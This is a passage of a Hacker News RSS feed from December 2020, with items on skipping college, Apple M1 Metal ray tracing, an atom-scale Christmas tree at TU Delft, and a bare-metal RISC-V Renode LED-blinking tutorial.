<![CDATA[You can't be “not good enough” to skip (or drop out of) college]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25510447">thread link</a>) | @kipply
<br/>
December 22, 2020 | https://carolchen.me/blog/no-not-good-enough/ | <a href="https://web.archive.org/web/*/https://carolchen.me/blog/no-not-good-enough/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section id="js-article">
    
<p>This is a pro-not-going-to-college post in the context of people around the tech industry. It is mostly for people who are entertaining no-college as something that might be good for them. It is not about why or if dropping out is a good idea, and more to air out the idea that not going to school requires some level of skill -- a notion probably brought forth by prolific dropouts. </p>
<p>Most messaging with not going to school along the lines of "there are more important things to work on", "you can learn faster outside of school", "why wait for a degree when you can start working now", or "you could be running a kickass startup instead". All of these are great reasons to not go to school, but they have an implication that you have to be skilled to a certain degree (haha, "degree"). Good enough to have the opportunities to work on more important things. Good enough that school isn't already challenging your learning. Good enough to get a job. Good enough to run a startup. </p>
<p>Most of my conversations with people who are interested in the concept of not going to school have implied that not being good enough is a blocker. Of course, there are other overlapping blockers related to fear, money, privilege, or it simply not being a good choice for your priorities, but I think "not being good enough" is wholy surmountable (provided you're accurately evaluating your own abilities). </p>
<h3 id="doing-the-things-no-one-else-has-had-the-chance-to-do">Doing the things no one else has had the chance to do<a href="#doing-the-things-no-one-else-has-had-the-chance-to-do" aria-label="Anchor link for: doing-the-things-no-one-else-has-had-the-chance-to-do"> <i></i></a>
</h3>
<p>I model ambition/excellence as a spectrum. One end is "getting ahead" and the other end is "getting a bonus". Canonical "getting ahead" would be graduating early, getting promoted quickly and rising to the top of your org in record time. It's hard to describe what "getting a bonus" might be like since it's by nature dependent on things one might not expect to have done. It can be summarized as "doing the things no one else has had the chance to do". </p>
<p>This is a wavy spectrum, and the range shrinks and ambiguities increase when you apply it to any individual. Regardless, I contend that "getting a bonus mentality" helps make it such that one can't be "not good enough" to skip college. </p>
<p>While they're two ends of a spectrum, I think few would argue that both approaches can lead to excellence, success, ambition, or whatever it is you want for yourself. However, with "getting a bonus", there is much less "not good enough" barrier. Instead of getting a job at Google after dropping out, you can work on a side project, take the time to pursue another career path, work at a non-profit or train to climb Mount Everest.</p>
<p>In my first year not going to school, I learned to juggle, taught programming bootcamp and suprised myself by moving to a "city" with less than a million people for my first experience living away from home. The time I saved allowed me to further pursue an interests in the arts I found too late because I was obsessed with getting internships in high school and gave me flexibility to travel. With the money I saved (and employment) I was able to donate over 25% of my pretax income. </p>
<p>Doing the things no one else has the chance to do is easier when outside of school, since you have increased flexibility and range to seek opportunities. Furthermore, this kind of excellence and achievement <em>scales</em>. If you buy that the difficulty to improve at something because exponentially harder, then you should gain more valuable experiences and skills by doing a variety of offbeat things. I don't want this to slip into a jack-of-all-trades-is-the-best-skillset career recommendation. This scalability does apply to your career skills, but it also applies to the values of your experiences, for all axes of "values". </p>
<h3 id="falling-behind">Falling behind<a href="#falling-behind" aria-label="Anchor link for: falling-behind"> <i></i></a>
</h3>
<p>If "getting a bonus" is the opposite of "getting ahead", then certainly that means you fall behind right? Perhaps! But you will have earned four years of doing things that no one else will have had. Given tech, you won't be a full-four years behind in your career, though it's possible you won't be as well off as you would be if you had gone to school. Additionally, I think that not being in school often helps accelerate your "goodness", though that's a separate "why get out of school" post. </p>
<p>Not going to college definitely put me behind in a lot of things. When working on TruffleRuby at Shopify I got burned by not having taking an Operating Systems or Concurrency course. Not having a degree puts me in a very difficult spot in immigrating anywhere (I'm stuck in Canada). It takes out the character I would have built struggling through courseloads (I was not good at high school, I probably would not have been that much better at college and it's unfortunate I may never be able to correct that). It certainly cuts down some my job opportunities. </p>
<p>So yeah, falling behind is a thing. One path is to just accept it with the other less-measurable experiences you have achieved, another is to convince yourself that it's not quite as real as one might think. </p>
<p>Once you get out of school, the different axis on which you can succeed grows quickly. Some may end up caring only about their salary, others on their social lives, others on their ability to start a family. It gets drastically harder to compare who is more successful, if you were even worried about that in the first place. The farther I get away from the school-scene the more apparent it is that I am not behind on valuable experiences.</p>
<hr>
<p>If you are interested in not going to school, then the much harder question is what on earth to do. I don't have many coherent thoughts about this that is suitable as general advice, but if you want to email me at hello@carolchen.me we can chat~</p>
<p>&lt;3, 
Kipply</p>


  </section></div>]]>
            </description>
            <link>https://carolchen.me/blog/no-not-good-enough/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25510447</guid>
            <pubDate>Tue, 22 Dec 2020 19:57:38 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Dive into Ray Tracing Performance on the Apple M1]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25510142">thread link</a>) | @adamnemecek
<br/>
December 22, 2020 | https://www.willusher.io/graphics/2020/12/20/rt-dive-m1 | <a href="https://web.archive.org/web/*/https://www.willusher.io/graphics/2020/12/20/rt-dive-m1">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
	<div>
		
<p>The Apple M1 available in the MacBook Air, MacBook Pro 13”, and Mac Mini has
been the focus of a ton of benchmarking writeups and blog posts about
the new chip. The performance overall, and especially performance/watt,
that Apple has achieved with the chip is very impressive.
As a ray tracing person, what caught my eye the most was the
performance AnandTech reported in their
<a href="https://www.anandtech.com/show/16252/mac-mini-apple-m1-tested/2">CineBench benchmarks</a>.
These scores were 1.6x higher than I got on my old Haswell desktop and 2x
higher than my new Tiger Lake laptop!
I had also been interested in trying out the new
<a href="https://developer.apple.com/videos/play/wwdc2020/10012/">ray tracing API for Metal</a>
that was announced at WWDC this year,
which bears some resemblance to the DirectX, Vulkan, and OptiX GPU ray tracing APIs.
So, I decided to pick up a Mac Mini to do some testing
on my own interactive path tracing project,
<a href="https://github.com/Twinklebear/ChameleonRT">ChameleonRT</a>,
and to get it running on the new Metal ray tracing API.
In this post, we’ll take a look at the new Metal ray tracing
API to see how it lines up with DirectX, Vulkan, OptiX and Embree,
then we’ll make some fair (and some extremely unfair) ray tracing
performance comparisons against the M1.</p>

<!--more-->



<p><a href="https://github.com/Twinklebear/ChameleonRT">ChameleonRT</a> is an open source
interactive path tracer that I’ve been working on to learn the different ray tracing APIs,
and to provide an example or starting point for myself and others working with them
in other projects.
ChameleonRT provides backends for the GPU ray tracing APIs:
<a href="https://github.com/Twinklebear/ChameleonRT/tree/master/dxr">DirectX Ray Tracing</a>,
<a href="https://github.com/Twinklebear/ChameleonRT/tree/master/vulkan">Vulkan KHR Ray Tracing</a>,
and <a href="https://github.com/Twinklebear/ChameleonRT/tree/master/optix">OptiX 7</a>.
Through the work discussed in this post, it also has a new
<a href="https://github.com/Twinklebear/ChameleonRT/tree/master/metal">Metal</a> GPU backend.
ChameleonRT also has an <a href="https://github.com/Twinklebear/ChameleonRT/tree/master/embree">Embree backend</a>
for fast multi-threaded and SIMD accelerated ray tracing on CPUs through
<a href="https://www.embree.org/">Embree</a>, <a href="https://ispc.github.io/">ISPC</a>, and <a href="https://github.com/oneapi-src/oneTBB">TBB</a>.
The rendering code in each backend is nearly identical and they produce almost pixel exact outputs,
with some possible small differences due to subtle differences in the ray tracing
libraries or shader languages.</p>

<p>ChameleonRT is different from popular ray tracing benchmark applications like
<a href="https://www.maxon.net/en/cinebench">CineBench</a>, <a href="http://www.luxmark.info/">LuxMark</a>,
and <a href="https://opendata.blender.org/">Blender Benchmark</a>, in that ChameleonRT is
a minimal interactive path tracer. CineBench, LuxMark, and Blender Benchmark are excellent
for getting a full picture of what performance to expect from a production film
renderer, as they are production renderers. However, there’s a lot more going
on in a production renderer than just ray tracing to support the kind of complex
geometries, materials, and effects used in film; and the large code
bases can be challenging to quickly port to a new architecture or API.
ChameleonRT is the exact opposite, supporting just one geometry type,
triangle meshes, and one material type, the Disney BRDF.
The rest of the code is similarly written to achieve interactive path tracing performance,
though I have tried to balance this with how complex the code is to read.
For example, the renderers use iterative ray tracing instead of recursion,
support only a simple sampling strategy, and don’t support alpha cut-out effects.
The use of iterative ray tracing is valuable on both the CPU and GPU, but is
especially important on the GPU, as the
overhead of recursive ray tracing calls in the pipeline can have a significant performance impact.
Similarly, ignoring alpha cut-out effects allows the GPU renderers
to skip using an any hit shader (and the Embree on to skip needing an intersection
filter). The any hit shader (or intersection filter) would be called during
BVH traversal after a candidate intersection with a triangle is found.
In the case that the BVH traversal is hardware accelerated, this ends up
producing a lot amount of back and
forth between the fixed function traversal hardware and the shader cores to run the any hit
shader during traversal, limiting the hardware’s performance.</p>

<blockquote>
  <p>What’s a path tracer? Path tracing is a technique in computer graphics for
rendering photo-realistic images by simulating the light transport in
the scene. It is a Monte Carlo technique, meaning that it randomly samples
light paths emitted from lights in the scene that reach the camera
by bouncing off objects in the scene. This is done by tracing the paths in reverse,
starting from the camera and tracing the path back through the scene.
A large number of light paths need to be sampled to produce a noise-free
image. Path tracing is not restricted to photo-realism, and is the
core rendering algorithm used in major film renderers, such as: Pixar’s Renderman,
Disney’s Hyperion, Autodesk’s Arnold, and Weta’s Manuka.
See <a href="https://en.wikipedia.org/wiki/Path_tracing">Wikipedia</a> for more.</p>
</blockquote>



<p>The new ray tracing API in Metal will be familiar to those who’ve used inline ray
tracing in DirectX or Vulkan. For a good introduction to Metal’s API, check out the <a href="https://developer.apple.com/videos/play/wwdc2020/10012/">Discover ray tracing
with Metal</a> video from WWDC 2020,
and the <a href="https://developer.apple.com/documentation/metal/accelerating_ray_tracing_using_metal?language=objc">accompanying sample</a>.
Inline ray tracing allows applications to make ray tracing calls in any shader stage,
e.g., fragment/pixel shaders, vertex shaders, compute shaders, etc.
Inline ray tracing allows ray tracing effects, for example accurate reflections and shadows,
to be integrated into the regular rasterization pipeline.
Inline ray tracing can also be used from a compute shader to implement a standalone
path tracing based renderer. ChameleonRT is a standalone path tracer, and takes
the compute shader approach for Metal.</p>

<p>At a high-level, ray tracing in Metal proceeds as follows: you upload your
geometry data, build bottom-level primitive acceleration structures over them, then create instances
referencing those acceleration structures and build a top-level acceleration structure over
the instances.
To render the scene you dispatch a compute shader and trace rays against the top-level
acceleration structure to get back intersection results. The intersection results provide
you with the intersected primitive and geometry IDs, and if using instancing, the instance ID.
Your shader can then look up the geometry data for the object that was hit and shade it,
after which it can continue tracing the path.</p>

<p>At this time Metal only supports inline ray tracing, in contrast to DirectX and Vulkan, which
also provide support for ray tracing pipelines. Ray tracing pipelines are used
to implement standalone ray tracing renderers, and is the approach ChameleonRT
uses in its DirectX and Vulkan backends.
OptiX only supports ray tracing pipelines.
Ray tracing pipelines require the creation of a Shader Binding Table to
provide the API with a table of functions to call when specific objects
in the scene are intersected. The SBT can be difficult to setup and debug,
and is a common point of difficulty for developers learning these APIs.
For more information about the SBT, check out my post
<a href="https://www.willusher.io/graphics/2019/11/20/the-sbt-three-ways">“The RTX Shader Binding Table Three Ways”</a>.
However, the potential benefit of the SBT is that the GPU can reorder or group function
calls to reduce thread divergence. With inline ray tracing, the developer
must do this themselves, or do without
(check out another video from <a href="https://developer.apple.com/videos/play/wwdc2020/10013/">WWDC20</a>
for information here).
Right now, ChameleonRT does not do any reordering to reduce divergence.</p>

<p>Those familiar with Metal may know of the previous
<a href="https://developer.apple.com/documentation/metalperformanceshaders/metal_for_accelerating_ray_tracing?language=objc">Metal Performance Shaders ray intersector</a>.
The new support for inline ray tracing improves on this by allowing the renderer
to move entirely to the GPU. The previous ray intersector worked by taking
batches of rays, finding intersections in the scene, and writing these results
back out to memory. Multiple compute shaders would need to be dispatched to
trace the primary rays and create shadow and secondary rays, then trace the shadow rays
and continue the secondary rays while filtering out paths that terminated.
This requires significantly more memory traffic and compute dispatches, introducing overhead
to the renderer. Such an approach is also not well suited to augmenting traditional
rasterization pipelines with ray tracing effects.
Approaches based on tracing and sorting rays and intersection information to extract
coherence are valuable for complex film renderers, and can be implemented efficiently using inline
ray tracing as well.
For example, <a href="https://www.yiningkarlli.com/projects/hyperiondesign.html">Disney’s Hyperion renderer</a>
uses sorting and batching extensively to
extract coherent workloads from an otherwise incoherent and divergent distribution of rays.
There’s also an excellent higher-level <a href="https://youtu.be/frLwRLS_ZR0">video</a> explaining how this
works.</p>

<p>The Metal ray tracing API is quite nice to work with.
It bears a lot of similarity to the other ray tracing APIs, but has been streamlined
to be easier to use.
For example, compare the code required to build and compact a BVH in
<a href="https://github.com/Twinklebear/ChameleonRT/blob/master/dxr/dxr_utils.cpp#L877-L977">DirectX</a>
or <a href="https://github.com/Twinklebear/ChameleonRT/blob/master/vulkan/vulkanrt_utils.cpp#L46-L214">Vulkan</a>
with <a href="https://github.com/Twinklebear/ChameleonRT/blob/master/metal/metalrt_utils.mm#L318-L396">Metal</a>.
OptiX’s API provides a similar simplification, here’s the
<a href="https://github.com/Twinklebear/ChameleonRT/blob/master/optix/optix_utils.cpp#L183-L244">BVH build in OptiX</a>
for reference.
It’s also nice to have templates and C++ style functionality in the shader language,
a feature Metal shares with OptiX, which uses CUDA for the device side code.</p>

<p>This simplicity also has some drawbacks. For example, while in DirectX, Vulkan, and OptiX
you have control over where the acceleration structure memory is allocated,
Metal makes this allocation for you. As a result, you cannot allocate the acceleration
structures on a <code>MTLHeap</code>, and so to make sure they’re available for your rendering
pipeline, you must individually mark them as used in a loop instead of a single <code>useHeap</code> call.</p>

<figure><pre><code data-lang="objc"><span></span><span>// Use our top level acceleration structure</span>
<span>[</span><span>command_encoder</span> <span>setAccelerationStructure</span><span>:</span><span>bvh</span><span>-&gt;</span><span>bvh</span> <span>atBufferIndex</span><span>:</span><span>1</span><span>];</span>
<span>// Also mark all mesh acceleration structures used, as they're indirectly</span>
<span>// referenced by the top level one</span>
<span>for</span> <span>(</span><span>auto</span> <span>&amp;</span><span>mesh</span> <span>:</span> <span>bvh</span><span>-&gt;</span><span>meshes</span><span>)</span> <span>{</span>
    <span>[</span><span>command_encoder</span> <span>useResource</span><span>:</span><span>mesh</span><span>-&gt;</span><span>bvh</span> <span>usage</span><span>:</span><span>MTLResourceUsageRead</span><span>];</span>
<span>}</span></code></pre></figure>

<p>This can add some overhead if you have a lot of bottom level BVHs, as can be the
case in scenes with many instances.
It’d be nice to be able to allocate the acceleration structures on a heap, and replace this loop
with a single <code>[command_encoder useHeap:data_heap-&gt;heap];</code></p>

<p>The API is also simplified significantly by not including ray tracing pipelines and
only requiring a Shader Binding Table-esque
structure when implementing custom geometries or other operations that need
to happen …</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.willusher.io/graphics/2020/12/20/rt-dive-m1">https://www.willusher.io/graphics/2020/12/20/rt-dive-m1</a></em></p>]]>
            </description>
            <link>https://www.willusher.io/graphics/2020/12/20/rt-dive-m1</link>
            <guid isPermaLink="false">hacker-news-small-sites-25510142</guid>
            <pubDate>Tue, 22 Dec 2020 19:31:55 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Mark Rober (former NASA) launches a 30 day Creative Engineering Class]]>
            </title>
            <description>
<![CDATA[
Score 133 | Comments 93 (<a href="https://news.ycombinator.com/item?id=25509619">thread link</a>) | @O_H_E
<br/>
December 22, 2020 | https://monthly.com/mark-rober-engineering | <a href="https://web.archive.org/web/*/https://monthly.com/mark-rober-engineering">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://monthly.com/mark-rober-engineering</link>
            <guid isPermaLink="false">hacker-news-small-sites-25509619</guid>
            <pubDate>Tue, 22 Dec 2020 18:41:33 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Periodic Table of Visualization Methods]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25509609">thread link</a>) | @fallenatreus
<br/>
December 22, 2020 | https://letsandeepio.github.io/viz-method-table/ | <a href="https://web.archive.org/web/*/https://letsandeepio.github.io/viz-method-table/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://letsandeepio.github.io/viz-method-table/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25509609</guid>
            <pubDate>Tue, 22 Dec 2020 18:40:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[4nm tall Christmas tree is the world’s smallest one]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25509600">thread link</a>) | @giuliomagnifico
<br/>
December 22, 2020 | https://www.tudelft.nl/en/2020/tnw/tu-delft-physics-student-makes-worlds-smallest-christmas-tree/ | <a href="https://web.archive.org/web/*/https://www.tudelft.nl/en/2020/tnw/tu-delft-physics-student-makes-worlds-smallest-christmas-tree/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                    
                        <p><strong>Every year, people all over the world try to make the biggest artificial Christmas tree. Like the Gubbio Christmas Tree, formed by thousands of lights on the slopes of Mount Ingino. Or the illumination of the 372-metre high transmission mast at Lopik in The Netherlands. Maura Willems, a student of Applied Physics at Delft University of Technology (TU Delft), decided to do the opposite.&nbsp; She created what is probably the world’s smallest Christmas tree.</strong></p><p>For her graduation, Willems works with a scanning tunneling microscope: a complex device that is capable of scanning individual atoms and even changing their position. She uses this microscope to build small structures, literally atom by atom, in order to study their quantum mechanical properties.</p><p>But sometimes you can also use technology for something more fun. Willems came up with the idea of making a Christmas tree by removing 51 atoms from a perfect crystal lattice. The tree is exactly 4 nanometers tall, or 4 millionths of a millimeter. But that is, admittedly, without counting the tree-topper.</p><div id="c701136"><div data-namespace-typo3-fluid="true">

    
            
        
            <div>
                <div>
                    
                        <div id="c701138">


		<p><a href="https://d1rkab7tlqy5f1.cloudfront.net/News/2020/12_December/TNW/KleinsteKerstboom.jpg" data-imagezoom="" data-width="2094" data-height="2094">
							
	
			
	
			<img src="https://d1rkab7tlqy5f1.cloudfront.net/News/2020/12_December/TNW/KleinsteKerstboom.jpg" width="2094" height="2094" alt="">
		

		

						</a>
					
			
	

	

				
		</p>
	








</div>
                    
                </div>
                <div>
                    
                        <div id="c701139">


		<p><a href="https://d1rkab7tlqy5f1.cloudfront.net/News/2020/12_December/TNW/MauraWillems.jpg" data-imagezoom="" data-width="1600" data-height="1600">
							
	
			
	
			<img src="https://d1rkab7tlqy5f1.cloudfront.net/News/2020/12_December/TNW/MauraWillems.jpg" width="1600" height="1600" alt="">
		

		

						</a>
					
			
	

	

				
		</p>
	








</div>
                    
                </div>
            </div>
        
    
        

    
</div></div>
                    
                </div></div>]]>
            </description>
            <link>https://www.tudelft.nl/en/2020/tnw/tu-delft-physics-student-makes-worlds-smallest-christmas-tree/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25509600</guid>
            <pubDate>Tue, 22 Dec 2020 18:40:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Using Predictive Power Score to Pinpoint Non-Linear Correlations]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25509560">thread link</a>) | @danielmp1202
<br/>
December 22, 2020 | https://www.narrativetext.co/data-hub/using-predictive-power-score-to-pinpoint-non-linear-correlations | <a href="https://web.archive.org/web/*/https://www.narrativetext.co/data-hub/using-predictive-power-score-to-pinpoint-non-linear-correlations">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
          <p><img src="https://www.narrativetext.co/assets/application/160x160/img3.jpg" alt="Image Description"></p><h2>Join our private community in Slack</h2>
          <p>
            Keep up to date by participating in this global community of data
            scientists. We talk about data science use cases, we share notebooks,
            we participate in data science competitions, we help each other,
            and we share new ML techniques and much more!
          </p>
        </div></div>]]>
            </description>
            <link>https://www.narrativetext.co/data-hub/using-predictive-power-score-to-pinpoint-non-linear-correlations</link>
            <guid isPermaLink="false">hacker-news-small-sites-25509560</guid>
            <pubDate>Tue, 22 Dec 2020 18:36:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Baremetal RISC-V Renode – Part 1: Blinky]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25509538">thread link</a>) | @homarp
<br/>
December 22, 2020 | https://blog.y2kbugger.com/baremetal-riscv-renode-1.html | <a href="https://web.archive.org/web/*/https://blog.y2kbugger.com/baremetal-riscv-renode-1.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <div>
        <!-- Google Photos Album: https://photos.app.goo.gl/LUXeip6Xz85QRTn78
https://www.youtube.com/watch?v=D0VuYe77Wu0&list=PLb-MsRpo_wlLW0EWRpAqnbbDsf4kxSI1x -->

<div id="background">
<h2><a href="#id4">Background</a></h2>
<p>I'm exploring the line between hardware and software by creating a series of demos within a minimal, free and open source environment. These demos span from blinking an LED to implementing a toy operating system. The goal is to minimize parts of the system that we take for granted and gain a better understanding of computers and operating systems.</p>

<div id="what-is-risc-v">
<h3><a href="#id6">What is RISC-V?</a></h3>
<p>RISC-V is an open alternative to ARM or x86.</p>
<p>Wikipedia</p>
<blockquote>
RISC-V (pronounced "risk-five") is an open standard instruction set architecture (ISA) based on established reduced instruction set computer (RISC) principles. Unlike most other ISA designs, the RISC-V ISA is provided under open source licenses that do not require fees to use.</blockquote>
</div>
<div id="what-is-renode">
<h3><a href="#id7">What is Renode?</a></h3>
<p>Renode is a simulator designed for embedded firmware. What sets it apart is the goal of not only emulating CPUs and SOCs, but also entire boards with peripherals such as ethernet and even multi-node networks of devices.</p>
<p>Alternatives such as QEMU aren't as optimized for the embedded space.</p>
<p>An emulator that you might use for playing video game ROMs is specialized for a single platform. For example, in an emulator cpu, graphics chips, audio, memory-map, etc are fixed and optimized. Renode on the other hand configures each platform with a config file.</p>
</div>
</div>
<div id="source-code">
<h2><a href="#id8">Source code</a></h2>
<p>To get started you will need to clone the repository. This includes all of the examples as well as the source for Renode simulator and GCC RISC-V toolchain.</p>
<p>Renode and GCC are linked via <tt>git submodule</tt> so if you use <tt><span>--recursive</span></tt> you can clone everything in one shot.</p>
<div><pre><span></span>git clone --recursive https://github.com/y2kbugger/baremetal-riscv-renode.git
</pre></div>
</div>


<div id="blinking-a-virtual-led">
<h2><a href="#id13">Blinking a virtual LED</a></h2>
<p>To verify and get familiar with the tools we'll start off with the "Hello, World" of hardware projects: blinking an LED.</p>
<p>Blinking a virtual "LED" involves a few steps:</p>
<ol>
<li>Build <strong>image</strong> from source code</li>
<li>Launch the hardware <strong>simulator</strong> configured by the platform (repl) file</li>
<li>Load the image into <strong>RAM</strong> of the simulator</li>
</ol>
<div id="just-get-it-running">
<h3><a href="#id14">Just get it running</a></h3>
<p>First open up the project folder:</p>
<pre>$ cd 1_blinky
</pre>
<p>Then following command will handle all steps 1-3, we'll break this down later:</p>
<pre>$ make launch
</pre>
<p>If everything went correctly, you should see something like this:</p>
<p><img alt="blinky demo running" src="https://lh3.googleusercontent.com/pw/ACtC-3dKs20yaz1biM2MWXyi7HAcI0pb-BHYDYD1XM92Al11dQPQ26OJY8YULAlHPHtduGETCN5Y5D6aXtkiFi3-9tB3RNtj4A687SGo765evyqri2TjKMCyQeNSLNfZ-SV52yXlIEar9iQj2aEzPKAmBGrQOA=w628-h449-no"></p><p>You should have also noticed the monitor window open up. This is used to control the running renode machine; the <tt>?</tt> command will list the rest. The tab completion is also very helpful.</p>
<p><img alt="renode monitor" src="https://lh3.googleusercontent.com/pw/ACtC-3f6eXxClG8aqr6wk2twPPD-lXLA7C4vskcZkecZVwPlqSYNCrxrdtvzBSEgK0YLixLm3OuJzJeM63alK8B1ATSZUp594xdfz2u8-vQeMlTSLMRl_ihZHDEQtH4scresowV29jguNfTZpzdqeX1sTttQng=w442-h197-no"></p><p>Quit using <tt>q</tt> or <tt>quit</tt>:</p>
<pre>(vexriscv-machine) quit
</pre>
<p>Alternatively you can kill renode using <tt>CTRL</tt> + <tt>C</tt> in the terminal that you launched it from.</p>
</div>
<div id="hardware-configuration">
<h3><a href="#id15">Hardware configuration</a></h3>
<p>The hardware to will be simulated is defined using a renode specific platform description format <a href="#renode-describing-platforms" id="id1">[3]</a></p>
<p>vexriscv.repl:</p>
<pre>mem: Memory.MappedMemory @ sysbus 0x0
    size: 0x00040000

cpu: CPU.VexRiscv @ sysbus

gpio_out: GPIOPort.LiteX_GPIO @ sysbus 0x60000800
    type: Type.Out
    0 -&gt; led0@0
    1 -&gt; led1@0

led0 : Miscellaneous.LED @ gpio_out 0
led1 : Miscellaneous.LED @ gpio_out 1
</pre>
<p>I like this because we can make a very minimal hardware configuration, free from any vendor specific complexity. Besides the cpu and memory, we have a general purpose input output (GPIO) register mapped to memory location <tt>0x60000800</tt>. The <tt><span>-&gt;</span></tt> makes a connection from the GPIO pins to the LEDs. I don't exactly know why we need both <tt>0 <span>-&gt;</span> led0@0</tt> and <tt>@ gpio_out 0</tt> as it seems redundant; if anyone knows, please let me know. You'll also commonly see  <tt><span>-&gt;</span></tt> used for connecting interrupts.</p>
<p>To toggle the LED we will need to write a driver that knows how to control the GPIO by writing to it's register.</p>
</div>
<div id="blinky-source-code">
<h3><a href="#id16">Blinky source code</a></h3>
<p>This initial program is written exclusively in RISC-V assembly <a href="#riscv-prgrammers-guide" id="id2">[4]</a> this is simple enough that every instruction that gets executed can be traced to this source file.</p>
<p>The code to drive this GPIO device is dead simple, you just need to write data to the memory location that maps to the GPIO pins.</p>
<p>Note that the platform specifies the mapping of <tt>0x60000800</tt> to the GPIO register.</p>
<p>baremetal.s:</p>
<div><pre><span></span><span>.equ</span> <span>LED</span><span>,</span> <span>0x60000800</span>
<span>.equ</span> <span>DELAY_COUNT</span><span>,</span> <span>9000000</span>
<span>.equ</span> <span>LED_STATE_INITIAL</span><span>,</span> <span>0</span><span>b00</span>
<span>.equ</span> <span>LED_STATE_TOGGLE_MASK</span><span>,</span> <span>0</span><span>b01</span>

<span>.section</span> <span>.text</span>
<span>.global</span> <span>_start</span>
<span>_start:</span>
        <span>li</span> <span>a5</span><span>,</span> <span>LED</span>
        <span>li</span> <span>a4</span><span>,</span> <span>LED_STATE_INITIAL</span>
        <span>li</span> <span>a6</span><span>,</span> <span>LED_STATE_TOGGLE_MASK</span>
        <span>sw</span> <span>a4</span><span>,</span> <span>0x0</span><span>(</span><span>a5</span><span>)</span>
<span>loop:</span>
        <span>li</span> <span>a0</span><span>,</span> <span>DELAY_COUNT</span>      <span># reset counter</span>
<span>delay_loop:</span>
        <span>addi</span> <span>a0</span><span>,</span> <span>a0</span><span>,</span> <span>-</span><span>1</span>         <span># count down</span>
        <span>bnez</span> <span>a0</span><span>,</span> <span>delay_loop</span>
<span>toggle_led:</span>
        <span>lw</span> <span>a4</span><span>,</span> <span>0x0</span><span>(</span><span>a5</span><span>)</span>          <span># read in old led state</span>
        <span>xor</span> <span>a4</span><span>,</span> <span>a4</span><span>,</span> <span>a6</span>          <span># toggle led state word</span>
        <span>sw</span> <span>a4</span><span>,</span> <span>0x0</span><span>(</span><span>a5</span><span>)</span>          <span># write new state</span>
        <span>jump</span> <span>loop</span><span>,</span> <span>t0</span>
</pre></div>
</div>
</div>
<div id="building-an-elf-binary-using-gcc">
<h2><a href="#id17">Building an elf binary using gcc</a></h2>
<p>GCC will build an ELF binary based on our assembly source code. This binary is the ROM image and Renode is the emulator.</p>
<p>By default, gcc outputs a format called ELF. This format is understood and loaded by the OS, <a href="https://lwn.net/Articles/631631/">i.e. linux,</a>. Renode also has the ability to understand ELF files and will load the sections into memory and put the program counter at the right spot to start executing <a href="#renode-elf-start" id="id3">[1]</a>.</p>
<div><pre><span></span>riscv32-unknown-elf-gcc baremetal.s baremetal.c -ggdb -O0 -o image -ffreestanding -nostdlib
</pre></div>
<dl>
<dt>riscv32-unknown-elf-gcc</dt>
<dd>gnu compiler. This compiles, assembles, and links input source code. This is the special cross compiling variant that we built earlier which runs on your host architecture (e.g. x86), but outputs binaries for riscv32.</dd>
<dt>baremetal.s</dt>
<dd>Assemble source file.</dd>
</dl>
<table>
<colgroup><col>
<col>
</colgroup><tbody>
<tr><td>
<kbd><span>-g<var>gdb</var></span></kbd></td>
<td>Turn on debugging symbols so that gdb can reference memory locations by name.</td></tr>
<tr><td>
<kbd><span>-O</span></kbd></td>
<td>Sets the optimization level, 0 for off</td></tr>
<tr><td>
<kbd><span>-o <var>image</var></span></kbd></td>
<td>Name of the output ELF binary</td></tr>
<tr><td>
<kbd><span>-f<var>freestanding</var></span></kbd></td>
<td>don't use or require main. Don't assume we have an operating system.</td></tr>
<tr><td>
<kbd><span>-n<var>ostdlib</var></span></kbd></td>
<td>don't rely on c standard libraries being available.</td></tr>
</tbody>
</table>
</div>
<div id="interactively-debugging-renode">
<h2><a href="#id18">Interactively Debugging Renode</a></h2>
<p>Pause and step though code that is running on the simulator.</p>
<div id="attaching-the-gnu-debugger">
<h3><a href="#id19">Attaching the GNU Debugger</a></h3>
<p>After launching, you may attach GDB using <cite>make debug</cite>. This connects to the GDB server already running within Renode. It uses a GDB script to store default configuration, such as breaking execution and starting the text user interface or TUI, which shows source code alongside the disassembly.</p>
<div><pre><span></span>$ make launch
$ make debug
</pre></div>
<p>If you are familiar with GDB you know the power of setting breakpoint, inspecting stacks, and much much more.</p>
<div>
<p><img alt="gdb tui" src="https://lh3.googleusercontent.com/pw/ACtC-3chg3Hd7-XPkvOum0SQv3f9EZ30vjZ3BB70OMbEqWVWO9GkvjOh-sBBWg-cU_oD2xo7jj4TTvQReAX-2F4HSt6OPOur1bb06A-fQZUti-STZ0clEEkYPsCrHAhMq2rVkKLU2psnCGzE_pfs5rIWrda0xg=w454-h669-no"></p><p>GDB Text User Interface (TUI)</p>
</div>
</div>
<div id="useful-gdb-scenarios">
<h3><a href="#id20">Useful GDB scenarios</a></h3>
